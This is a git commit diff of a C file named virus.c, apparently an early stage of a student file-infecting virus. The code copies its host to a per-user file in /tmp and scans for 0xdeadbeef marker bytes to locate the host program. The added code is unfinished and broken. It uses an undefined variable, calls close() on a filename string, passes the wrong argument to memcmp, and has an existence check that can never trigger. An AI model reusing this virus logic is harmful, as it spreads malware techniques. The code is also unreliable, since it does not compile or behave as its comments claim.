252465b10a95cb506c287a43ac5320cf22dc5172
Paul Wrubel <pjwrubel@mtu.edu>
2018-03-21 21:17:35 -0400

    added to virus

--- virus.c
+++ virus.c
@@ -1,5 +1,6 @@
 
 #include <fcntl.h>
+#include <unistd.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/errno.h>
@@ -7,12 +8,35 @@
 int main(int argc, char** argv) {
     
     // Copy Host to /tmp/host.ruid
-    // check if host exists there already
 
-    int fd = open(argv[1])
+    char tempfilename[20];
+    uid_t ruid = getuid();
+    sprintf(tempfilename, "/tmp/host.%ud", ruid);
 
-    // delete if so
+    // attempt to create new file
+    int fd = open(filename, O_CREAT | O_RDWR, S_IRWXU);
 
-    // else create the file and execute it
+    // check if that file was already there
+    if (fd == -1 && errno == EEXIST) {
+        // file exists! attempt to delete and leave
+        unlink(tempfilename);
+
+        // close our descriptor so the file is *officially* deleted
+        close(tempfilename);
+        return 0;
+    }
+
+    byte magic[4] = {0xde, 0xad, 0xbe, 0xef};
+    byte buf[4];
+
+    // find the hosts start location
+    do {
+        read(fd, buf, 4);
+    } while(memcmp(magic, read, 4) != 0);
+
+    // where are we?
+    off_t hoststart = lseek(fd, 0, SEEK_CUR);
+
+
 
 }
